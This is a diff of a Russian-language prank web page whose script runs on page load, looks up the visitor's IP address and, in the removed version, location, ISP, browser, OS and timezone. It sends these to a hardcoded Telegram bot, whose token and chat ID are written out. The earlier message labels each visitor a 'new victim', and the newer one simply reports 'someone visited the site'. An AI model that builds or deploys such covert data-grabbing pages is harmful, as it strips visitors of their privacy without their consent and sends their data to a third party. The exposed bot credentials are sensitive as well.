@@ -19,7 +19,7 @@
             border-radius: 20px;
             padding: 30px;
             box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
-            max-width: 600px;
+            max-width: 500px;
             width: 90%;
         }
         h1 {
@@ -35,8 +35,8 @@
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
         }
         .info-block p {
-            margin: 8px 0;
-            padding: 8px;
+            margin: 10px 0;
+            padding: 10px;
             border-bottom: 1px solid #eee;
             display: flex;
             justify-content: space-between;
@@ -76,127 +76,38 @@
     </div>
 
     <script>
-        // =============================================
-        // НАСТРОЙКИ - ТВОИ ДАННЫЕ
-        // =============================================
+        // ТВОИ ДАННЫЕ
         const botToken = '8698773306:AAEfpKve0rNrxK88e79rquBXHK91RhFesTw';
         const chatId = '1238755996';
-        
-        // =============================================
-        // ПОЛУЧЕНИЕ ДАННЫХ О БРАУЗЕРЕ
-        // =============================================
-        function getBrowserInfo() {
-            const ua = navigator.userAgent;
-            let browser = "Неизвестно";
-            let os = "Неизвестно";
-            
-            // Определяем браузер
-            if (ua.indexOf("Firefox") > -1) browser = "Mozilla Firefox";
-            else if (ua.indexOf("SamsungBrowser") > -1) browser = "Samsung Internet";
-            else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) browser = "Opera";
-            else if (ua.indexOf("Trident") > -1) browser = "Internet Explorer";
-            else if (ua.indexOf("Edge") > -1) browser = "Microsoft Edge";
-            else if (ua.indexOf("Chrome") > -1) browser = "Google Chrome";
-            else if (ua.indexOf("Safari") > -1) browser = "Apple Safari";
-            
-            // Определяем ОС
-            if (ua.indexOf("Windows NT 10.0") > -1) os = "Windows 10/11";
-            else if (ua.indexOf("Windows NT 6.2") > -1) os = "Windows 8";
-            else if (ua.indexOf("Windows NT 6.1") > -1) os = "Windows 7";
-            else if (ua.indexOf("Mac OS X") > -1) os = "macOS";
-            else if (ua.indexOf("iPhone") > -1) os = "iOS (iPhone)";
-            else if (ua.indexOf("iPad") > -1) os = "iOS (iPad)";
-            else if (ua.indexOf("Android") > -1) os = "Android";
-            else if (ua.indexOf("Linux") > -1) os = "Linux";
-            
-            return { browser, os };
-        }
-        
-        // =============================================
-        // ПОЛУЧЕНИЕ IP И ГЕО-ДАННЫХ
-        // =============================================
+
+        // ПРОСТАЯ ФУНКЦИЯ ПОЛУЧЕНИЯ IP
         async function getIpInfo() {
             try {
-                // Пробуем разные API
-                const apis = [
-                    'https://api.myip.com/',
-                    'https://ip.nf/me.json',
-                    'https://ipapi.co/json/'
-                ];
-                
-                for (let api of apis) {
-                    try {
-                        const response = await fetch(api);
-                        const data = await response.json();
-                        
-                        if (data.ip) {
-                            return {
-                                ip: data.ip,
-                                country: data.country || data.country_name || 'Неизвестно',
-                                city: data.city || 'Неизвестно',
-                                region: data.region || 'Неизвестно',
-                                isp: data.org || data.isp || data.organisation || 'Неизвестно'
-                            };
-                        }
-                    } catch (e) {
-                        continue;
-                    }
-                }
-                
-                // Если ничего не сработало, пробуем через прокси
-                const proxyResponse = await fetch('https://api.allorigins.win/get?url=' + encodeURIComponent('https://ipapi.co/json/'));
-                const wrapper = await proxyResponse.json();
-                const data = JSON.parse(wrapper.contents);
+                // Пробуем получить IP через разные сервисы
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
                 
                 return {
                     ip: data.ip,
-                    country: data.country_name || 'Неизвестно',
-                    city: data.city || 'Неизвестно',
-                    region: data.region || 'Неизвестно',
-                    isp: data.org || 'Неизвестно'
+                    country: 'Неизвестно',
+                    city: 'Неизвестно',
+                    region: 'Неизвестно',
+                    isp: 'Неизвестно'
                 };
             } catch (error) {
-                console.error('Ошибка:', error);
+                console.log('Ошибка:', error);
                 return null;
             }
         }
-        
-        // =============================================
-        // ОТПРАВКА В TELEGRAM (МАКСИМУМ ИНФЫ)
-        // =============================================
-        async function sendToTelegram(ipData, browserInfo) {
-            const now = new Date();
-            const timeStr = now.toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
-            
-            // Определяем время у пользователя (часовой пояс браузера)
-            const userTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const userTime = new Date().toLocaleString('ru-RU', { timeZone: userTimezone });
-            
-            // Тип устройства
-            let deviceType = "Компьютер";
-            if (navigator.userAgent.match(/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i)) {
-                deviceType = "Мобильное устройство";
-            }
-            
-            // Собираем сообщение
-            const message = `🔥 <b>НОВАЯ ЖЕРТВА!</b> 🔥
+
+        // ФУНКЦИЯ ОТПРАВКИ В TELEGRAM
+        async function sendToTelegram(ipData) {
+            const message = `🕵️ <b>Кто-то зашел на сайт!</b>
 
 📍 <b>IP:</b> ${ipData.ip}
 🌍 <b>Страна:</b> ${ipData.country}
 🏙️ <b>Город:</b> ${ipData.city}
-🗺️ <b>Регион:</b> ${ipData.region}
-📡 <b>Провайдер:</b> ${ipData.isp}
-
-💻 <b>Браузер:</b> ${browserInfo.browser}
-📱 <b>ОС:</b> ${browserInfo.os}
-📟 <b>Тип:</b> ${deviceType}
-🕐 <b>Часовой пояс:</b> ${userTimezone}
-
-⏰ <b>Его время:</b> ${userTime}
-🤖 <b>Время розыгрыша:</b> ${timeStr}
-
-🕵️ <b>User Agent:</b> 
-<code>${navigator.userAgent.substring(0, 100)}...</code>`;
+📡 <b>Провайдер:</b> ${ipData.isp}`;
 
             try {
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -210,48 +121,39 @@
                         parse_mode: 'HTML'
                     })
                 });
-                console.log('Отправлено в Telegram');
+                console.log('Отправлено!');
             } catch (error) {
-                console.error('Ошибка отправки:', error);
+                console.log('Ошибка Telegram:', error);
             }
         }
-        
-        // =============================================
+
         // ПОКАЗ НА СТРАНИЦЕ
-        // =============================================
         async function showInfo() {
             const infoDiv = document.getElementById('info');
-            infoDiv.innerHTML = '<p class="loading">Собираю данные...</p>';
             
             const ipData = await getIpInfo();
-            const browserInfo = getBrowserInfo();
             
             if (ipData && ipData.ip) {
-                // Показываем на странице
                 infoDiv.innerHTML = `
                     <p><span class="label">IP адрес:</span> <span>${ipData.ip}</span></p>
                     <p><span class="label">Страна:</span> <span>${ipData.country}</span></p>
                     <p><span class="label">Город:</span> <span>${ipData.city}</span></p>
                     <p><span class="label">Провайдер:</span> <span>${ipData.isp}</span></p>
-                    <p><span class="label">Браузер:</span> <span>${browserInfo.browser}</span></p>
-                    <p><span class="label">ОС:</span> <span>${browserInfo.os}</span></p>
-                    <p><span class="label">Часовой пояс:</span> <span>${Intl.DateTimeFormat().resolvedOptions().timeZone}</span></p>
                 `;
                 
-                // Отправляем в Telegram
-                await sendToTelegram(ipData, browserInfo);
+                await sendToTelegram(ipData);
             } else {
                 infoDiv.innerHTML = '<p class="loading">Не удалось получить данные</p>';
             }
         }
-        
-        // Клик по картинке
+
+        // КЛИК ПО КАРТИНКЕ
         document.getElementById('trollImage').addEventListener('click', function() {
-            alert('🔍 Обновляю данные...');
+            alert('Обновляю...');
             showInfo();
         });
-        
-        // Запуск при загрузке
+
+        // ЗАПУСК
         showInfo();
     </script>
 </body>
